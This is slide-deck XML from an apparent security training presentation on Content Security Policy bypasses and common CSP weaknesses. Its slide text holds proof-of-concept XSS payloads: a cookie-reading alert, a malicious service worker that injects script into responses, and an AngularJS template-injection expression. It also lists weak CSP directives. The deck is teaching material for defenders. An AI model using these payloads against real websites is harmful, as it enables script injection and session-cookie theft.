          <a:xfrm>
            <a:off x="3025140" y="3721060"/>
            <a:ext cx="2628781" cy="674608"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2853"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3153370" y="3817263"/>
            <a:ext cx="2372320" cy="482203"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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&lt;script nonce="r4nd0m"&gt;</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var data = "";alert(document.cookie);//";</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&lt;/script&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5863590" y="2036207"/>
            <a:ext cx="2903101" cy="3991451"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 663"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFCF5"/>
          </a:solidFill>
          <a:ln w="15240">
            <a:solidFill>
              <a:srgbClr val="D9D4C9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5878830" y="2051447"/>
            <a:ext cx="2872621" cy="384929"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 250"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F3EEE3"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7218878" y="2123599"/>
            <a:ext cx="192405" cy="240506"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">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2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6007060" y="2508885"/>
            <a:ext cx="1782008" cy="200382"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1550"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Service Worker Bypass</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6007060" y="2752725"/>
            <a:ext cx="2616160" cy="160734"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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Vulnerable CSP:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> script-src 'self'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6007060" y="2956917"/>
            <a:ext cx="2616160" cy="321469"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="squar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Attack:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> Register malicious service worker that intercepts all requests</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6007060" y="3359944"/>
            <a:ext cx="2616160" cy="2281952"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 844"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Shape 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6000750" y="3359944"/>
            <a:ext cx="2628781" cy="2281952"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 844"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6128980" y="3456146"/>
            <a:ext cx="2372320" cy="2089547"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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navigator.serviceWorker.register('/sw.js');</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1250"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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sw.js intercepts and injects malicious content</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self.addEventListener('fetch', function(event) {</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event.respondWith(</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new Response('&lt;script&gt;alert(document.cookie)&lt;/script&gt;')</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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6007060" y="5723453"/>
            <a:ext cx="2616160" cy="160734"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1250"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>CSP doesn't apply to Service Worker responses</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Shape 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8839200" y="2036207"/>
            <a:ext cx="2903220" cy="3991451"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 663"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFCF5"/>
          </a:solidFill>
          <a:ln w="15240">
            <a:solidFill>
              <a:srgbClr val="D9D4C9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Shape 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8854440" y="2051447"/>
            <a:ext cx="2872740" cy="384929"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 250"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F3EEE3"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10194608" y="2123599"/>
            <a:ext cx="192405" cy="240506"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">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3</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Text 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8982670" y="2508885"/>
            <a:ext cx="2269569" cy="200382"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1550"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>AngularJS Template Injection</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Text 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8982670" y="2752725"/>
            <a:ext cx="2616279" cy="321469"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="squar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Vulnerable CSP:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> script-src 'self' https://ajax.googleapis.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Text 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8982670" y="3117652"/>
            <a:ext cx="2616279" cy="321469"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="squar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Attack:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> Load AngularJS from whitelisted domain and exploit template expressions</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Shape 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8982670" y="3520678"/>
            <a:ext cx="2616279" cy="1317546"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1461"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Shape 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8976360" y="3520678"/>
            <a:ext cx="2628900" cy="1317546"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1461"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Text 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9104590" y="3616881"/>
            <a:ext cx="2372439" cy="1125141"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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&lt;script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"&gt;&lt;/script&gt;</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&lt;div ng-app&gt;</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{{constructor.constructor('alert(1)')()}}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">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&lt;/div&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Text 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8982670" y="4919782"/>
            <a:ext cx="2616279" cy="321469"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1250"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>AngularJS evaluates expressions, bypassing CSP restrictions</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Shape 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2887980" y="6109216"/>
            <a:ext cx="8854440" cy="828199"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2324"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="C9DDE9"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="36" name="Image 1" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3016210" y="6225778"/>
            <a:ext cx="200501" cy="160377"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="Text 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3344942" y="6213753"/>
            <a:ext cx="1604010" cy="200382"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1550"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Key Takeaway</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="Text 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3344942" y="6486644"/>
            <a:ext cx="8269248" cy="321469"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1250"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>CSP is a powerful security mechanism, but it must be configured correctly and combined with other security measures. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Never rely on CSP alone</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> - always implement proper input validation, output encoding, and regular security audits to protect against bypass techniques.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760351"/>
            <a:ext cx="7324844"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Common CSP Weaknesses</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4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57964"/>
            <a:ext cx="7324844"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Common CSP Weaknesses</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="2133719"/>
            <a:ext cx="4552712" cy="425291"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">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1. Overly Permissive Policies</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="2785824"/>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BAD: script-src *</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="3368040"/>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BAD: script-src 'unsafe-inline'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="3950256"/>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BAD: script-src 'unsafe-eval'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="4532471"/>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BAD: script-src https:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="5279145"/>
            <a:ext cx="6244709" cy="35957"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2B4150">
              <a:alpha val="50000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="5570220"/>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2. Whitelisted CDNs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="6222325"/>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RISKY: script-src 'self' https://cdnjs.cloudflare.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="6804541"/>
            <a:ext cx="6244709" cy="362903"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1750" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attacker can load any script from the CDN</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
